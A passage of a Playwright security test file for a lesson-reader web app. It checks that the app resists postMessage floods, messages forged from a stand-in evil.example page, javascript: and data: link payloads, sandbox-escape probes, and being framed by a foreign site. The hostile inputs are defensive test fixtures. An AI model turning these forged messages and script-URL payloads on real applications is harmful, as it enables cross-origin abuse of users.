    await importDemo(page);
    const f = await openLesson(page, 'LRN-DEMO');
    const frame = page.locator('iframe.lesson-frame');
    await f.evaluate(() => { for (let i = 1; i <= 1000; i++) parent.postMessage({ lrn: 1, type: 'lrn:size', height: 10000 + i }, '*'); });
    await page.waitForTimeout(300);
    expect(parseInt(await frame.evaluate((el) => el.style.height), 10)).toBeLessThanOrEqual(10060);
    await f.evaluate(() => {
      const pad = 'x'.repeat(1e5);
      const t = setInterval(() => { for (let i = 0; i < 20; i++) parent.postMessage({ lrn: 1, type: 'lrn:selection', empty: false, quote: { exact: pad }, position: { start: 0, end: 1 } }, '*'); }, 10);
      setTimeout(() => clearInterval(t), 5000);
    });
    let worst = 0;
    for (let i = 0; i < 8; i++) {
      const t0 = Date.now();
      await page.evaluate(() => document.title);
      worst = Math.max(worst, Date.now() - t0);
      await page.waitForTimeout(500);
    }
    console.log(`T-046 storm: worst app answer ${worst} ms`);
    expect(worst).toBeLessThan(1000);
    await expect(page.locator('[data-screen="reader"]')).toHaveCount(1);
  });

  test('messages from other windows (a foreign page that opened the app, a same-origin frame, the app itself) are ignored', async ({ page, context }) => {
    test.setTimeout(60_000);
    await importDemo(page);
    await openLesson(page, 'LRN-DEMO');
    const frame = page.locator('iframe.lesson-frame');
    const h0 = await frame.evaluate((el) => el.style.height);
    const url = page.url();
    const evil = await context.newPage();
    await evil.goto('https://evil.example/start');
    const [app2] = await Promise.all([
      context.waitForEvent('page', (p) => p.url().includes('/EasyLRN/')),
      evil.evaluate((u) => { window.app = window.open(u, '_blank'); }, url),
    ]);
    await app2.waitForLoadState();
    await expect(app2.locator('[data-lesson-state="ready"]')).toBeVisible({ timeout: 15000 });
    const h2 = await app2.locator('iframe.lesson-frame').evaluate((el) => el.style.height);
    await evil.evaluate((ms) => setTimeout(() => {
      window.app.postMessage({ lrn: 1, type: 'lrn:size', height: 7 }, '*');
      window.app.postMessage({ lrn: 1, type: 'lrn:link', href: 'https://example.org/tea' }, '*');
      window.app.frames[0]?.postMessage({ lrn: 1, type: 'lrn:init', fontScale: 3 }, '*'); // to the lesson: its bridge checks the source
    }, ms), NO_GESTURE_MS);
    await page.evaluate((ms) => setTimeout(() => {
      const i = document.createElement('iframe');
      document.body.append(i);
      i.contentWindow.parent.postMessage({ lrn: 1, type: 'lrn:size', height: 9 }, '*');
      window.postMessage({ lrn: 1, type: 'lrn:size', height: 9 }, '*');
      i.remove();
    }, ms), NO_GESTURE_MS);
    await page.waitForTimeout(NO_GESTURE_MS + 1500);
    expect(await frame.evaluate((el) => el.style.height)).toBe(h0);
    expect(await app2.locator('iframe.lesson-frame').evaluate((el) => el.style.height)).toBe(h2);
    expect(await app2.frames().find((x) => x.url().includes('/c/LRN-DEMO/')).evaluate(() => getComputedStyle(document.documentElement).fontSize)).toBe('18px');
    expect(popups.filter((p) => p !== evil && p !== app2)).toEqual([]);
    expect(page.url()).toBe(url);
  });

  test('lrn:link with a real tap: javascript:, data:, another course, the app itself and URLs outside the allowlist do nothing; allowlisted and course links work', async ({ page }) => {
    await importDemo(page);
    await importCourse(page, 'LRN-EVIL', EVIL);
    const f = await openLesson(page, 'LRN-EVIL');
    const base = new URL('./', page.url()).href;
    const button = (id, href) => f.evaluate(([id, href]) => {
      document.getElementById(id)?.remove();
      const b = document.createElement('button');
      b.id = id;
      b.textContent = id;
      b.onclick = () => parent.postMessage({ lrn: 1, type: 'lrn:link', href }, '*');
      document.querySelector('h1').after(b);
    }, [id, href]);
    for (const href of ['javascript:parent.alert(1)', 'data:text/html,x', `${base}c/LRN-DEMO/lessons/0001-vidove-chay.html`, `${base}#/settings`,
      `${base}index.html`, 'https://example.org/not-in-list', 'http://example.org/allowed', 'https://example.org/allowed?x=1', 'https://claude.ai/artifact/Unknown']) {
      await button('forge', href);
      await lf(page).locator('#forge').click();
      await page.waitForTimeout(400);
      expect(popups, href).toEqual([]);
      expect(page.url(), href).toMatch(/#\/c\/LRN-EVIL\/read\/0001$/);
    }
    const tab = page.context().waitForEvent('page');
    await lf(page).locator('#ok').click();
    const t = await tab;
    await t.waitForLoadState();
    expect(t.url()).toBe('https://example.org/allowed');
    expect(await t.evaluate(() => window.opener)).toBe(null);
    await t.close();
    await button('go2', `${base}c/LRN-EVIL/lessons/0002-vtori.html`);
    await lf(page).locator('#go2').click();
    await expect(page).toHaveURL(/#\/c\/LRN-EVIL\/read\/0002$/);
  });
});

// --- 4. A broken bridge, big lessons -------------------------------------------------------

test.describe('T-046 a broken bridge and big lessons', () => {
  test('[T046-D1] a lesson with a top-level `var parent = …` (an ordinary variable name) loses the bridge: it must be shown in the fallback mode, not stopped', async ({ page }) => {
    test.setTimeout(40_000);
    test.fail(true, 'T046-D1: a document that never speaks is taken for a self-navigation; after two reloads the lesson is stopped with a wrong message');
    allowed = [/status of 40/];
    await importCourse(page, 'LRN-VAR', {
      'INDEX.md': strToU8('# LRN-VAR\n'),
      'lessons/0001-var.html': doc('<h1>Урок</h1><ul id="list"><li>a</li></ul><p style="height:3000px">…</p><script>var parent = document.getElementById("list"); parent.append(document.createElement("li"));</script>'),
    });
    await openLesson(page, 'LRN-VAR', '0001', { wait: null });
    await expect(page.locator('[data-lesson-state="fallback"], [data-lesson-state="error"]')).toBeVisible({ timeout: 20000 });
    expect(await lessonState(page)).toBe('fallback');
    await expect(page.locator('[data-field="lesson-note"]')).toHaveText('Маркирането не е налично за този урок.');
  });

  test('a lesson that replaces addEventListener/ResizeObserver/postMessage: fallback with an inner scroll; the attacks still fail there', async ({ page }) => {
    test.setTimeout(40_000);
    allowed = [/Refused|violates|sandbox|Blocked|status of 40/i];
    await importCourse(page, 'LRN-BROKEN2', {
      'INDEX.md': strToU8('# LRN-BROKEN2\n'),
      'lessons/0001-b.html': doc('<h1>Урок</h1><p style="height:3000px">…</p><script>EventTarget.prototype.addEventListener = () => {}; window.ResizeObserver = undefined; window.postMessage = () => {};</script>'),
    });
    await openLesson(page, 'LRN-BROKEN2', '0001', { wait: null });
    await expect(page.locator('[data-lesson-state="fallback"], [data-lesson-state="error"]')).toBeVisible({ timeout: 20000 });
    expect(await lessonState(page)).toBe('fallback');
    const f = frameOf(page, 'LRN-BROKEN2');
    const r = await f.evaluate(async () => {
      const t = async (fn) => { try { return String(await fn()); } catch (e) { return `blocked:${e.name}`; } };
      return [await t(() => parent.document.title), await t(() => indexedDB.open('lrn-app') && 'x'), await t(() => fetch('https://example.org/x')), await t(() => window.open('https://example.org/y'))];
    });
    expect(r).toEqual(['blocked:SecurityError', 'blocked:SecurityError', 'blocked:TypeError', 'null']);
    expect(external).toEqual([]);
    await appIntact(page);
  });

  test('[T046-D2] a very long lesson (over 200 000 px): the end of the lesson must stay reachable', async ({ page }) => {
    test.fail(true, 'T046-D2: lrn:size over 200 000 is dropped; the frame keeps its old height and the rest of the lesson cannot be reached (no inner scroll)');
    await importCourse(page, 'LRN-LONG', {
      'INDEX.md': strToU8('# LRN-LONG\n'),
      'lessons/0001-long.html': doc('<h1>Дълъг урок</h1><div style="height:240000px">…</div><p id="end">Край на урока</p>'),
    });
    const f = await openLesson(page, 'LRN-LONG');
    await page.waitForTimeout(1000);
    const docH = await f.evaluate(() => document.documentElement.getBoundingClientRect().height);
    const frameH = await page.locator('iframe.lesson-frame').evaluate((el) => el.getBoundingClientRect().height);
    const inner = await f.evaluate(() => document.scrollingElement.scrollHeight > innerHeight + 2 && getComputedStyle(document.documentElement).overflowY !== 'hidden');
    console.log(`T-046 long lesson: document ${docH}, frame ${frameH}, inner scroll ${inner}`);
    expect(docH).toBeGreaterThan(240000);
    expect(frameH >= docH - 2 || inner).toBe(true);
  });

  test('a big lesson (8 MB of text): import, render and open in reasonable time, the app stays responsive', async ({ page }) => {
    test.setTimeout(90_000);
    const para = `<p>Това е дълъг абзац от голям урок, за да се провери сглобяването и показването. ${'x'.repeat(400)}</p>\n`;
    const body = `<h1>Голям урок</h1>${para.repeat(Math.ceil(8e6 / para.length))}<p id="end">Край</p>`;
    await importCourse(page, 'LRN-BIG', { 'INDEX.md': strToU8('# LRN-BIG\n'), 'lessons/0001-big.html': doc(body) });
    const t0 = Date.now();
    const f = await openLesson(page, 'LRN-BIG');
    const took = Date.now() - t0;
    console.log(`T-046 big lesson: open ${took} ms, frame ${await page.locator('iframe.lesson-frame').evaluate((el) => el.style.height)}`);
    expect(took).toBeLessThan(30000);
    expect(await f.evaluate(() => !!document.getElementById('end'))).toBe(true);
    const t1 = Date.now();
    await page.evaluate(() => 1);
    expect(Date.now() - t1).toBeLessThan(1500);
  });
});

// --- 5. The app in a foreign frame ----------------------------------------------------------

test('T-046 the app refuses to start inside a foreign site frame (no screens, no database)', async ({ page, context }) => {
  const appUrl = new URL('./#/settings', page.url()).href;
  await context.route('https://evil.example/frame', (route) => route.fulfill({ status: 200, contentType: 'text/html', body: `<iframe id="app" src="${appUrl}" width="800" height="600"></iframe>` }));
  const evil = await context.newPage();
  await evil.goto('https://evil.example/frame');
  const inner = evil.frameLocator('#app');
  await expect(inner.locator('[data-field="framed"]')).toHaveText('EasyLRN не работи вътре в друга страница. Отвори приложението директно.');
  await expect(inner.locator('[data-screen]')).toHaveCount(0);
});
